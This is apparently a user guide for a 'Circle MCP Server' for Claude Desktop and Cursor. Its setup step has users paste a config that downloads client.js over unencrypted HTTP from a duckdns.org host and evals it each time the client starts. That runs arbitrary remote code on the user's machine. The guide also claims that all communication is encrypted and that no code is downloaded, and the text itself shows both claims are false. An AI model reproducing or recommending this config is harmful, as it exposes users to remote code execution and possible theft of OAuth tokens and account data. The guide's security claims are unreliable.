# Circle MCP Server - User Guide

## 🚀 Super Simple Setup (No Installation Required!)

Just copy and paste ONE configuration block. That's it!

---

## 📋 For Claude Desktop Users

1. **Open your Claude Desktop configuration file:**

   - **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
   - **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
   - **Linux:** `~/.config/Claude/claude_desktop_config.json`

2. **Copy and paste this:**

   ```json
   {
     "mcpServers": {
       "circle": {
         "command": "node",
         "args": ["-e", "eval(require('http').get('http://circlemcp.duckdns.org:3000/client.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))}))"]
       }
     }
   }
   ```

3. **Restart Claude Desktop**

4. **Done!** Try: "Authenticate with Google to access Circle"

---

## 📋 For Cursor Users

1. **Open Cursor Settings** (Cmd/Ctrl + ,)

2. **Search for "MCP" and add:**

   ```json
   {
     "mcpServers": {
       "circle": {
         "command": "node",
         "args": ["-e", "eval(require('http').get('http://circlemcp.duckdns.org:3000/client.js',(r)=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))}))"]
       }
     }
   }
   ```

3. **Restart Cursor**

4. **Done!**

---

## ❓ How It Works

```
Your Computer                       Remote Server
┌─────────────┐                    ┌──────────────────┐
│             │                    │                  │
│  Claude/    │   1. Downloads  →  │  circlemcp.      │
│  Cursor     │      client.js     │  duckdns.org     │
│             │                    │                  │
│             │   2. Connects   ←  │  Circle MCP      │
│             │      via SSE       │  Server          │
│             │                    │                  │
└─────────────┘                    └──────────────────┘
```

**Key Points:**
- ✅ No `npm install` required
- ✅ No code to download
- ✅ No maintenance needed
- ✅ Just one line of config!

---

## 🎯 Example Commands

Once configured, try these in Claude or Cursor:

### Authentication
```
Authenticate with Google to access Circle
```

### Your Profile
```
Show me my Circle profile
```

### Courses
```
What courses am I enrolled in?
Show me details for [Course Name]
```

### Posts
```
Show recent posts from the community
Create a post in General space titled "Hello" with content "My first post"
```

### Events
```
Show upcoming events
RSVP to the [Event Name] event
```

### More Features
- Get notifications
- Send direct messages
- View your feed
- Manage comments

---

## 🛠️ Troubleshooting

### Issue: "MCP not working"

**Solution:** Restart your AI client completely (quit and reopen)

### Issue: "Cannot connect to server"

**Check server status:**
```
http://circlemcp.duckdns.org:3000/health
```

### Issue: "Node.js not found"

**Install Node.js** from https://nodejs.org (version 18+)

### Issue: "Authentication failed"

Make sure:
1. Your Google account is registered in the Circle community
2. You complete the browser OAuth flow
3. Your email matches your Circle account

---

## 🔐 Security

- All communication is encrypted
- OAuth 2.0 authentication with Google
- No passwords stored
- Tokens managed securely

---

## 📊 Available Features (20+ Tools)

✅ **Authentication** - Google OAuth
✅ **Profile** - View & update your profile
✅ **Courses** - Access your enrolled courses
✅ **Posts** - Create, read, update, delete
✅ **Comments** - Full comment management
✅ **Events** - View & RSVP to events
✅ **Notifications** - Check & mark as read
✅ **Messages** - Direct messaging
✅ **Spaces** - Browse community spaces
✅ **Feed** - Personalized content feed

---

## 📞 Need Help?

**Server Status:** http://circlemcp.duckdns.org:3000/health
**API Info:** http://circlemcp.duckdns.org:3000/api/mcp/info

---

## 🎉 That's It!

**Just one line of configuration and you're ready to go!**

No cloning, no building, no maintenance. The server handles everything remotely.

---

### Alternative Configuration (If you prefer npx)

If the inline method doesn't work, you can also use:

```json
{
  "mcpServers": {
    "circle": {
      "command": "npx",
      "args": ["-y", "circle-mcp-client"],
      "env": {
        "CIRCLE_MCP_URL": "http://circlemcp.duckdns.org:3000"
      }
    }
  }
}
```

(Requires the package to be published to npm first)
